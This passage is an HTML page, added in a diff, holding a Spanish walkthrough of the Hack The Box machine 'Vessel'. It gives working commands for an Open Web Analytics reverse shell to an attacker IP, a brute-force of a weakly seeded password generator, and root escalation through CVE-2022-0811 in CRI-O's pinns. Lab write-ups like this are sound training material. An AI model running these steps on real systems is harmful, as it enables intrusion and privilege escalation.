+                    <li>Desencadena una reverse shell de vuelta al atacante</li>
+                </ol>
+                
+                <p>La vulnerabilidad aprovecha el hecho de que OWA genera datos de usuario en caché para el administrador que son accesibles sin autenticación adecuada, permitiendo a atacantes recuperar información sensible de sesión.</p>
+                
+                <h3>Obteniendo Acceso Inicial</h3>
+                <p>Ejecuto el exploit completo para obtener una reverse shell:</p>
+                
+                <pre><code class="language-bash">python3 owa.py http://openwebanalytics.vessel.htb 10.10.16.2 443</code></pre>
+                
+                <p>Esto me otorga exitosamente acceso como usuario <code>www-data</code>. Ahora puedo ver dos usuarios en <code>/home</code>:</p>
+                
+                <pre><code class="language-bash">ls -la /home</code></pre>
+                
+                <pre><code class="language-plaintext">total 16
+drwxr-xr-x  4 root   root   4096 Aug 11  2022 .
+drwxr-xr-x 19 root   root   4096 Aug 11  2022 ..
+drwx------  5 ethan  ethan  4096 Aug 11  2022 ethan
+drwxrwxr-x  3 steven steven 4096 Aug 11  2022 steven</code></pre>
+                
+                <p>Pruebo la contraseña de la base de datos encontrada anteriormente con ambos usuarios, pero no funciona para SSH ni <code>su</code>.</p>
+                
+                <h2>Enumeración como www-data</h2>
+                <p>Tengo acceso de lectura al directorio home de Steven y descubro archivos inusuales:</p>
+                
+                <pre><code class="language-bash">ls -la /home/steven</code></pre>
+                
+                <pre><code class="language-plaintext">total 33796
+drwxrwxr-x 3 steven steven     4096 Aug 11  2022 .
+drwxr-xr-x 4 root   root       4096 Aug 11  2022 ..
+lrwxrwxrwx 1 root   root          9 Apr 18  2022 .bash_history -> /dev/null
+-rw------- 1 steven steven      220 Apr 17  2022 .bash_logout
+-rw------- 1 steven steven     3771 Apr 17  2022 .bashrc
+drwxr-xr-x 2 ethan  steven     4096 Aug 11  2022 .notes
+-rw------- 1 steven steven      807 Apr 17  2022 .profile
+-rw-r--r-- 1 ethan  steven 34578147 May  4  2022 passwordGenerator</code></pre>
+                
+                <p>El directorio <code>.notes</code> contiene archivos adicionales:</p>
+                
+                <pre><code class="language-bash">ls -la /home/steven/.notes/</code></pre>
+                
+                <pre><code class="language-plaintext">total 40
+drwxr-xr-x 2 ethan  steven  4096 Aug 11  2022 .
+drwxrwxr-x 3 steven steven  4096 Aug 11  2022 ..
+-rw-r--r-- 1 ethan  steven 17567 Aug 10  2022 notes.pdf
+-rw-r--r-- 1 ethan  steven 11864 May  2  2022 screenshot.png</code></pre>
+                
+                <p>Comprobando el tipo de archivo del ejecutable sospechoso:</p>
+                
+                <pre><code class="language-bash">file passwordGenerator</code></pre>
+                
+                <pre><code class="language-plaintext">passwordGenerator: PE32 executable (console) Intel 80386, for MS Windows</code></pre>
+                
+                <p>Es un ejecutable de Windows. Transfiero los tres archivos a mi máquina para análisis.</p>
+                
+                <h2>Analizando el Generador de Contraseñas</h2>
+                <p>La captura de pantalla proporciona una pista sobre cómo se generó la contraseña:</p>
+                <p><img src="./media/image2.png" alt="Captura de pantalla de la aplicación passwordGenerator mostrando una GUI con opciones de generación de contraseñas" /></p>
+                
+                <p>El PDF está protegido por contraseña, impidiendo el acceso:</p>
+                <p><img src="./media/image4.png" alt="PDF protegido por contraseña solicitando credenciales" /></p>
+                
+                <p>Basándome en la captura de pantalla, teorizo que la contraseña del PDF fue generada usando este ejecutable de Windows.</p>
+                
+                <h3>Extrayendo Código Python del Ejecutable</h3>
+                <p>Transfiero el ejecutable a una VM de Windows para análisis. Cuando añado la extensión <code>.exe</code>, el icono del archivo indica que está relacionado con Python. Usando <code>strings</code>, encuentro referencias a <code>pyside2</code>, confirmando que esta es una aplicación Python compilada usando el framework GUI PySide2.</p>
+                
+                <p>Uso <code>pyinstxtractor</code> para extraer el código Python empaquetado:</p>
+                
+                <pre><code class="language-bash">python pyinstxtractor.py passwordGenerator.exe</code></pre>
+                
+                <p>Esto extrae numerosos archivos, incluyendo <code>passwordGenerator.pyc</code>, que contiene el bytecode compilado. Para convertir esto de vuelta a código fuente Python legible, uso <code>uncompyle6</code>:</p>
+                
+                <pre><code class="language-bash">pip install uncompyle6
+uncompyle6 passwordGenerator.pyc > passwordGenerator.py</code></pre>
+                
+                <h3>Analizando la Lógica de Generación de Contraseñas</h3>
+                <p>El código decompilar revela los conjuntos de caracteres usados para la generación de contraseñas:</p>
+                
+                <pre><code class="language-python">if char == 0:
+    charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&*()_-+={}[]|:;<>,.?"
+elif char == 1:
+    charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
+elif char == 2:
+    charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"</code></pre>
+                
+                <p>Estos corresponden a tres opciones: todos los caracteres, solo alfabéticos, o solo alfanuméricos.</p>
+                
+                <p>El código crítico de generación de contraseñas es:</p>
+                
+                <pre><code class="language-python">qsrand(QTime.currentTime().msec())
+password = ""
+for i in range(length):
+    idx = qrand() % len(charset)
+    nchar = charset[idx]
+    password += str(nchar)</code></pre>
+                
+                <h3>Identificando la Debilidad</h3>
+                <p>La vulnerabilidad radica en la inicialización del PRNG. La función <code>qsrand()</code> inicializa el generador de números aleatorios con <code>QTime.currentTime().msec()</code>, que devuelve el componente de milisegundos del tiempo actual.</p>
+                
+                <p>Según la documentación de Qt (<a href="https://doc.qt.io/qt-6/qtime.html#msec">QTime::msec()</a>), esta función devuelve un valor entre 0 y 999. ¡Esto significa que solo hay 1.000 semillas posibles, y por lo tanto solo 1.000 contraseñas posibles para cualquier configuración dada!</p>
+                
+                <h2>Fuerza Bruta de la Contraseña del PDF</h2>
+                <p>Dado que la aleatoriedad está limitada a 1.000 valores posibles, puedo generar todas las contraseñas posibles y usarlas para crackear el PDF. Creo un script de Python para generar el diccionario:</p>
+                
+                <pre><code class="language-python">from PySide2.QtCore import qsrand, qrand
+
+def genPassword(ms: int) -> str:
+    length = 32
+    charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&*()_-+={}[]|:;<>,.?'
+    qsrand(ms)
+    password = ''
+    for i in range(length):
+        idx = qrand() % len(charset)
+        nchar = charset[idx]
+        password += str(nchar)
+    return password
+
+passwords = [genPassword(i) for i in range(1000)]
+
+with open('passwords.txt', 'w') as f:
+    f.write('\n'.join(passwords))</code></pre>
+                
+                <p>Ejecuto este script en mi VM de Windows con Python 3.10 y PySide2 instalados. Una vez tengo el diccionario, uso <code>pdfcrack</code> para probar todas las contraseñas:</p>
+                
+                <pre><code class="language-bash">pdfcrack -f notes.pdf -w passwords.txt</code></pre>
+                
+                <pre><code class="language-plaintext">PDF version 1.6
+Security Handler: Standard
+V: 2
+R: 3
+P: -1028
+Length: 128
+Encrypted Metadata: True
+FileID: c19b3bb1183870f00d63a766a1f80e68
+U: 4d57d29e7e0c562c9c6fa56491c4131900000000000000000000000000000000
+O: cf30caf66ccc3eabfaf371623215bb8f004d7b8581d68691ca7b800345bc9a86
+
+found user-password: 'YG7Q7RDzA+q&ke~MJ8!yRzoI^VQxSqSS'</code></pre>
+                
+                <p>¡Éxito! La contraseña se crackea casi instantáneamente.</p>
+                
+                <h2>Movimiento Lateral al Usuario Ethan</h2>
+                <p>Abriendo el PDF revela una nota de Ethan a Steven:</p>
+                
+                <blockquote>
+                    <p>Dear Steven,</p>
+                    <p>As we discussed since I'm going on vacation you will be in charge of system maintenance. Please ensure that the system is fully patched and up to date.</p>
+                    <p>Here is my password: <strong>b@mPRNSVTjjLKId1T</strong></p>
+                    <p>System Administrator<br>Ethan</p>
+                </blockquote>
+                
+                <p>Ahora tengo credenciales para el usuario <code>ethan</code>. Puedo hacer SSH o <code>su</code> a esta cuenta:</p>
+                
+                <pre><code class="language-bash">ssh ethan@vessel.htb</code></pre>
+                
+                <p>Después de iniciar sesión como Ethan, compruebo privilegios sudo pero no encuentro ninguno. Su directorio home no contiene nada inmediatamente útil, así que necesito buscar en otro lugar para la escalada de privilegios.</p>
+                
+                <h2>Escalada de Privilegios - SUID de pinns en CRI-O</h2>
+                <p>Buscando archivos propiedad del grupo <code>ethan</code>, descubro un binario SUID interesante:</p>
+                
+                <pre><code class="language-bash">find / -group ethan 2>/dev/null | grep -v /proc | grep -v /sys | grep -v /home | grep -v /run</code></pre>
+                
+                <pre><code class="language-plaintext">/usr/bin/pinns</code></pre>
+                
+                <p>Probando el binario revela un comportamiento inusual:</p>
+                
+                <pre><code class="language-bash">pinns</code></pre>
+                
+                <pre><code class="language-plaintext">[pinns:e]: Path for pinning namespaces not specified: Invalid argument</code></pre>
+                
+                <pre><code class="language-bash">pinns --help
+pinns --version</code></pre>
+                
+                <pre><code class="language-plaintext">Segmentation fault (core dumped)</code></pre>
+                
+                <p>El binario no tiene opciones estándar de línea de comandos como <code>--help</code>, lo cual es inusual. Buscando "pinns vulnerabilities" me lleva a CVE-2022-0811: <a href="https://www.sysdig.com/blog/cve-2022-0811-cri-o">CRI-O Container Escape Vulnerability</a></p>
+                
+                <h3>Entendiendo CRI-O y la Vulnerabilidad</h3>
+                <p>El binario <code>pinns</code> es parte de CRI-O, una interfaz de runtime de contenedores similar a Docker. Su código fuente está disponible en <a href="https://github.com/cri-o/cri-o/blob/v1.19.1/pinns/src/pinns.c">GitHub</a>.</p>
+                
+                <p>Una de las funcionalidades de <code>pinns</code> es establecer parámetros de kernel mediante la flag <code>-s</code>. La vulnerabilidad (CVE-2022-0811) existe porque el binario solo valida el primer parámetro para asegurar que es un parámetro de kernel legítimo, pero falla en validar parámetros adicionales concatenados con <code>+</code>.</p>
+                
+                <p>Por ejemplo:</p>
+                <pre><code class="language-bash">pinns -s 'param1=1+param2=2'</code></pre>
+                
+                <p>Aquí, <code>param1</code> se valida, pero <code>param2</code> no, permitiendo la inyección de parámetros de kernel arbitrarios.</p>
+                
+                <h3>Explotando kernel.core_pattern</h3>
+                <p>El parámetro <code>kernel.core_pattern</code> es particularmente peligroso. Define qué sucede cuando un programa crashea y vuelca core. Normalmente, se ve así:</p>
+                
+                <pre><code class="language-bash">cat /proc/sys/kernel/core_pattern</code></pre>
+                
+                <pre><code class="language-plaintext">|/usr/share/apport/apport %p %s %c %d %P %E</code></pre>
+                
+                <p>El pipe (<code>|</code>) al principio significa que el volcado de núcleo se canaliza al programa especificado, que se ejecuta como root. Modificando esto para apuntar a mi propio script, puedo ejecutar código arbitrario como root cuando cualquier proceso crashea.</p>
+                
+                <h3>Pasos de Explotación</h3>
+                <p>Primero, creo un script malicioso que hará <code>/bin/bash</code> SUID:</p>
+                
+                <pre><code class="language-bash">cat > /tmp/xd.sh << 'EOF'
+#!/bin/bash
+chmod +s /bin/bash
+EOF
+
+chmod +x /tmp/xd.sh</code></pre>
+                
+                <p>Ahora inyecto el valor malicioso de <code>core_pattern</code> usando <code>pinns</code>:</p>
+                
+                <pre><code class="language-bash">pinns -s 'kernel.shm_rmid_forced=1'+'kernel.core_pattern=|/tmp/xd.sh #' -f file -d /tmp -U</code></pre>
+                
+                <pre><code class="language-plaintext">[pinns:e]: Failed to bind mount ns: /proc/self/ns/user: Operation not permitted</code></pre>
+                
+                <p>A pesar del mensaje de error, el parámetro de kernel se modifica exitosamente. Puedo verificar esto:</p>
+                
+                <pre><code class="language-bash">cat /proc/sys/kernel/core_pattern</code></pre>
+                
+                <pre><code class="language-plaintext">|/tmp/xd.sh #</code></pre>
+                
+                <p>¡Perfecto! Ahora necesito provocar un crash para ejecutar mi script. Inicio un proceso en segundo plano y lo mato con SIGSEGV:</p>
+                
+                <pre><code class="language-bash">sleep 100 &
+killall -s SIGSEGV sleep</code></pre>
+                
+                <pre><code class="language-plaintext">[1]+ Segmentation fault (core dumped) sleep 100</code></pre>
+                
+                <p>El fallo de segmentación desencadena el manejador de volcado de núcleo, que ejecuta mi script como root. Comprobando <code>/bin/bash</code>:</p>
+                
+                <pre><code class="language-bash">ls -la /bin/bash</code></pre>
+                
+                <pre><code class="language-plaintext">-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash</code></pre>
+                
+                <p>¡Excelente! El bit SUID está establecido. Ahora puedo generar una shell de root:</p>
+                
+                <pre><code class="language-bash">bash -p</code></pre>
+                
+                <pre><code class="language-bash">whoami</code></pre>
+                
+                <pre><code class="language-plaintext">root</code></pre>
+                
+                <p>Ahora tengo acceso root completo y puedo recuperar la flag de root para completar la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
